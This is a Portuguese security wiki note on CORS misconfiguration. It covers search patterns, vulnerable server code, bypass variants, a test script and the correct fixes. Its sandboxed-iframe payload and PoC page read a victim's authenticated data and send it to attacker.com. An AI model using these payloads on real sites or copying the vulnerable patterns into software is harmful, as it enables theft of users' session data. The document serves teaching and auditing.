# CORS Misconfiguration

**Tags:** #alto #cors #cross-origin #credenciais #sessao
**OWASP:** A05:2021 — Security Misconfiguration
**CVSS Base:** 8.0 (Alto — leitura de resposta autenticada cross-origin)

---

## 📖 O que é

CORS (Cross-Origin Resource Sharing) define quais origens podem fazer requisições à API. Quando mal configurado — especialmente com `Access-Control-Allow-Credentials: true` e origem refletida dinamicamente — qualquer site pode ler responses autenticadas da vítima.

---

## 🔍 `grep_search` Táticas

```
Access-Control-Allow-Origin
cors(
origin:
setHeader.*Access-Control
allow_origins
CORS_ORIGIN
CORS_ALLOWED_ORIGINS
req.headers.origin
request.headers['origin']
credentials: true
Access-Control-Allow-Credentials
```

---

## 💣 Padrão Crítico — Origem Refletida + Credentials

```javascript
// ❌ CRÍTICO — reflete qualquer origem + permite credentials
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  // reflete tudo
    res.setHeader('Access-Control-Allow-Credentials', 'true');         // permite cookies
    next();
});
```

**Por que é crítico:** `credentials: true` instrui o browser a enviar cookies de sessão na requisição cross-origin. Se a origem é refletida, o banco do atacante pode ler TODAS as respostas autenticadas da vítima.

---

## 💣 Variantes de Misconfiguration

### 1. Wildcard com Credentials (Inválido, mas pode ser bypassado)

```
# Browser bloqueia: não pode usar wildcard COM credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# Mas alguns frameworks implementam erroneamente, vazar origin no lugar do *
```

### 2. Validação de Sufixo Falha

```javascript
// ❌ VULNERÁVEL — validação com endsWith pode ser bypassada
const allowedOrigin = 'trusted.com';
if (req.headers.origin.endsWith(allowedOrigin)) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
}
// Bypass: Origin: evil-trusted.com → endsWith('trusted.com') = true!
```

### 3. `null` Origin Aceito

```
# Acesso de iframe sandboxed ou URLs file://
Access-Control-Allow-Origin: null 

# Atacante em iframe sandboxed pode enviar Origin: null e ter acesso
```

```html
<!-- Exploit via iframe sandboxed -->
<iframe sandbox="allow-scripts allow-top-navigation-by-user-activation" 
        src="data:text/html,<script>
    fetch('https://target.com/api/user', {credentials: 'include'})
      .then(r => r.json())
      .then(d => fetch('https://attacker.com/?data=' + JSON.stringify(d)));
</script>"></iframe>
```

### 4. Regex com Bypass

```python
# ❌ VULNERÁVEL — regex mal construída
import re
TRUSTED_ORIGINS = re.compile(r'https://.*\.trusted\.com')

if TRUSTED_ORIGINS.match(origin):
    # Bypass: https://evil.trusted.com.attacker.com
    # match() testa desde o início, mas não âncora no fim sem $
    set_cors_header(origin)
```

---

## 💣 PoC de Exploit

```html
<!-- evil_cors.html — hospedar em http://attacker.com -->
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
    // Alvo: API autenticada com CORS misconfiguration
    fetch('https://target.com/api/user/profile', {
        credentials: 'include',  // inclui cookies da vítima
        method: 'GET',
    })
    .then(response => response.json())
    .then(data => {
        console.log('Dados roubados:', data);
        // Exfiltrar para servidor do atacante
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                victim_data: data,
                timestamp: Date.now()
            })
        });
        
        // Exibir para demonstração
        document.body.innerHTML = '<h1>CORS PoC</h1><pre>' + 
            JSON.stringify(data, null, 2) + '</pre>';
    })
    .catch(err => {
        document.body.innerHTML = '<h1>BLOQUEADO</h1><p>CORS configurado corretamente</p>';
    });
</script>
</body>
</html>
```

---

## 🧪 Script de Teste

```python
# .tmp/validate_cors.py
import requests

TARGET = "http://target.com/api/user"
EVIL_ORIGINS = [
    "https://evil.com",
    "null",
    "https://trusted.com.evil.com",
    "https://evil-trusted.com",
    "https://subdomain.evil.com",
]

for origin in EVIL_ORIGINS:
    r = requests.get(TARGET, headers={"Origin": origin}, timeout=10)
    acao = r.headers.get("Access-Control-Allow-Origin", "(não presente)")
    creds = r.headers.get("Access-Control-Allow-Credentials", "(não presente)")
    
    vuln = (acao == origin or acao == "null") and creds.lower() == "true"
    
    status = "🔴 VULN" if vuln else "✅ OK"
    print(f"{status} | Origin: {origin}")
    print(f"       ACAO: {acao} | Credentials: {creds}")
    print()
```

---

## 🛡️ Correção

```javascript
// ✅ CORRETO — whitelist explícita e estrita
const ALLOWED_ORIGINS = new Set([
    'https://app.mycompany.com',
    'https://admin.mycompany.com',
]);

app.use((req, res, next) => {
    const origin = req.headers.origin;
    
    if (ALLOWED_ORIGINS.has(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin');  // ← obrigatório quando refletindo origem
    }
    // Se origem não está na whitelist: não setar nada → browser bloqueia
    next();
});
```

```python
# ✅ CORRETO — Django CORS Headers
# settings.py
CORS_ALLOWED_ORIGINS = [
    "https://app.mycompany.com",
    "https://admin.mycompany.com",
]
CORS_ALLOW_CREDENTIALS = True
# CORS_ALLOW_ALL_ORIGINS = False  ← padrão, não mudar
```

---

## 🔗 Chain Exploits

```
CORS dinâmico + credentials: true → Dump completo de dados da sessão autenticada
CORS null aceito + iframe sandboxed → Bypass de origem sem detecção
CORS + validação de sufixo fraca → evil-trusted.com passa → exfiltração
CORS misconfiguration + API com PII → LGPD/GDPR violation cross-origin
CORS amplo + XSS → Exfiltrar tokens CSRF → CSRF full bypass
```

---

## 📌 Referências
- [[HTTP Security Headers]]
- [[XSS — Cross-Site Scripting]]
- [[CSRF & WebSocket Hijacking (CSWSH)]]
- [PortSwigger CORS](https://portswigger.net/web-security/cors)
